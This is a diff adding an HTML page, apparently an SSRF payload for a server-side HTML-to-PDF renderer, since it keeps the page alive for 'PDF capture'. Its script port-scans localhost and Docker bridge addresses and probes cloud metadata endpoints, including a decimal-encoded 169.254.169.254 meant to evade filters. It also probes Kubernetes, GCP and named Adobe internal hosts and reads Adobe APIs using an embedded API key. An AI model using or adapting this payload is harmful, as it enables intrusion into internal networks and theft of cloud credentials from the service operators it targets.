@@ -1,0 +1,181 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>v19 internal scan</title>
+<style>
+body{font:16px/1.2 monospace;margin:8px;white-space:pre-wrap}
+#r{font-size:15px}
+.ok{color:#060}.bad{color:#600}
+</style></head><body>
+<div id="r">v19 boot\n</div>
+<script>
+(function(){
+var R=document.getElementById('r');
+function L(s){R.textContent+=String(s)+'\n';}
+function dec(a,b,c,d){return ((a<<24)>>>0)+(b<<16)+(c<<8)+d;}
+L('===v19 internal scan '+new Date().toISOString());
+L('UA '+navigator.userAgent.slice(0,90));
+L('cores/mem '+navigator.hardwareConcurrency+'/'+navigator.deviceMemory);
+
+var results=[];
+function note(tag,ms,detail){
+  var line=tag+' t='+ms.toFixed(0)+'ms '+detail;
+  results.push(line); L(line);
+}
+
+// Timed fetch with abort
+function timedFetch(url, ms, mode){
+  mode=mode||'no-cors';
+  var t0=performance.now();
+  var c=new AbortController();
+  var timer=setTimeout(function(){try{c.abort();}catch(e){}}, ms);
+  return fetch(url,{mode:mode,cache:'no-store',signal:c.signal,redirect:'follow'})
+    .then(function(r){
+      clearTimeout(timer);
+      var dt=performance.now()-t0;
+      // no-cors: type opaque, status 0
+      return {ok:true,dt:dt,type:r.type,status:r.status,url:url};
+    })
+    .catch(function(e){
+      clearTimeout(timer);
+      var dt=performance.now()-t0;
+      return {ok:false,dt:dt,err:e.name+':'+e.message,url:url};
+    });
+}
+
+// Timed Image probe (works for some HTTP if browser allows)
+function timedImg(url, ms){
+  return new Promise(function(resolve){
+    var t0=performance.now();
+    var img=new Image();
+    var done=false;
+    var to=setTimeout(function(){
+      if(done)return; done=true;
+      img.src='';
+      resolve({ok:false,dt:performance.now()-t0,err:'timeout',url:url});
+    }, ms);
+    img.onload=function(){
+      if(done)return; done=true; clearTimeout(to);
+      resolve({ok:true,dt:performance.now()-t0,err:'load',url:url,w:img.naturalWidth});
+    };
+    img.onerror=function(){
+      if(done)return; done=true; clearTimeout(to);
+      resolve({ok:false,dt:performance.now()-t0,err:'error',url:url});
+    };
+    img.src=url+(url.indexOf('?')>=0?'&':'?')+'t='+Date.now();
+  });
+}
+
+// CORS readable probe for interesting hosts
+function corsRead(url, headers, tag){
+  var t0=performance.now();
+  var c=new AbortController();
+  setTimeout(function(){c.abort()},4000);
+  return fetch(url,{mode:'cors',headers:headers||{},signal:c.signal,cache:'no-store'})
+    .then(function(r){return r.text().then(function(t){
+      note(tag, performance.now()-t0, 'ST'+r.status+' B='+t.replace(/\s+/g,' ').slice(0,180));
+    });})
+    .catch(function(e){ note(tag, performance.now()-t0, 'ERR '+e.message); });
+}
+
+async function scanBatch(label, urls, timeoutMs, mode){
+  L('--- batch '+label+' n='+urls.length+' ---');
+  // concurrency 6
+  var i=0, out=[];
+  async function worker(){
+    while(i<urls.length){
+      var idx=i++; var u=urls[idx];
+      var r=await timedFetch(u, timeoutMs, mode||'no-cors');
+      var tag=label+' '+u.replace(/^https?:\/\//,'').slice(0,50);
+      if(r.ok) note(tag, r.dt, 'OK type='+r.type+' st='+r.status);
+      else note(tag, r.dt, 'FAIL '+r.err);
+      out.push(r);
+    }
+  }
+  await Promise.all([worker(),worker(),worker(),worker(),worker(),worker()]);
+  return out;
+}
+
+async function main(){
+  // 1) Localhost common ports HTTP
+  var localPorts=[80,81,443,3000,3306,5000,5432,5601,6379,8000,8080,8081,8443,8888,9000,9090,9100,9200,9222,9300,10250,2375,2376,8500,11211,27017];
+  var localUrls=localPorts.map(function(p){return 'http://127.0.0.1:'+p+'/';});
+  await scanBatch('lo-http', localUrls, 1200);
+
+  // 2) Localhost HTTPS
+  var loHttps=[443,8443,8080,9200,10250].map(function(p){return 'https://127.0.0.1:'+p+'/';});
+  await scanBatch('lo-https', loHttps, 1500);
+
+  // 3) Docker bridge / common gateway
+  var bridges=['172.17.0.1','172.18.0.1','10.0.0.1','10.0.0.2','10.1.0.1','192.168.0.1','192.168.1.1'];
+  var bridgeUrls=[];
+  bridges.forEach(function(ip){
+    [80,443,8080,8443].forEach(function(p){
+      bridgeUrls.push('http://'+ip+':'+p+'/');
+    });
+  });
+  await scanBatch('bridge', bridgeUrls, 1000);
+
+  // 4) Link-local metadata family via literal + decimal
+  var meta=[
+    'http://169.254.169.254/latest/meta-data/',
+    'http://'+dec(169,254,169,254)+'/latest/meta-data/',
+    'http://169.254.170.2/v2/metadata',
+    'http://'+dec(169,254,170,2)+'/v2/metadata',
+    'http://169.254.169.254/latest/api/token',
+  ];
+  await scanBatch('meta', meta, 1500);
+
+  // 5) Internal-looking hostnames HTTPS (may resolve in VPC)
+  var hosts=[
+    'https://kubernetes.default.svc/',
+    'https://kubernetes.default.svc.cluster.local/',
+    'https://metadata.google.internal/',
+    'https://consul.service.consul:8500/',
+    'http://metadata.google.internal/computeMetadata/v1/',
+    'https://platform-cs-edge.internal.adobe.io/',
+    'https://dc-api.internal.adobe.com/',
+    'https://elasticsearch:9200/',
+    'https://redis:6379/',
+    'https://localhost/',
+  ];
+  await scanBatch('hosts', hosts, 1500);
+
+  // 6) Img probes on a subset (sometimes different path than fetch)
+  L('--- img probes ---');
+  var imgs=[
+    'http://127.0.0.1:8080/favicon.ico',
+    'http://127.0.0.1:80/favicon.ico',
+    'http://169.254.169.254/latest/meta-data/',
+    'http://'+dec(169,254,169,254)+'/latest/meta-data/',
+    'http://172.17.0.1:80/favicon.ico',
+  ];
+  for(var i=0;i<imgs.length;i++){
+    var r=await timedImg(imgs[i], 1200);
+    note('img '+imgs[i].slice(0,40), r.dt, r.ok?('LOAD w='+r.w):r.err);
+  }
+
+  // 7) CORS-readable Adobe internal mesh (known good) + try a few more
+  L('--- cors adobe ---');
+  await corsRead('https://platform-cs-edge-jpn3.adobe.io/', {'x-api-key':'dc-prod-virgoweb'}, 'cors-edge');
+  await corsRead('https://dcdiscovery.adobe.io/index', {'x-api-key':'dc-prod-virgoweb','Accept':'application/json'}, 'cors-disc');
+  await corsRead('https://cc-api-storage.adobe.io/', {'x-api-key':'dc-prod-virgoweb'}, 'cors-stor');
+
+  // 8) Summary: fast fails vs slow timeouts (open port heuristic)
+  L('--- summary open-heuristic (dt>900ms fail/timeout) ---');
+  results.filter(function(l){return /t=\d+ms/.test(l);}).forEach(function(l){
+    var m=l.match(/t=(\d+)ms/);
+    if(m && parseInt(m[1],10)>=900) L('SLOW '+l);
+  });
+  L('===DONE n='+results.length+'===');
+}
+
+// Kick off and keep page alive with rAF (does not block network)
+var start=performance.now();
+main().then(function(){ L('main settled '+(performance.now()-start).toFixed(0)+'ms'); })
+  .catch(function(e){ L('main err '+e); });
+
+// 16s keep-alive for PDF capture without busy-wait CPU hog
+(function keep(t0){
+  if(performance.now()-t0<16000) requestAnimationFrame(function(){keep(t0);});
+  else L('keepalive end');
+})(performance.now());
+})();
+</script></body></html>
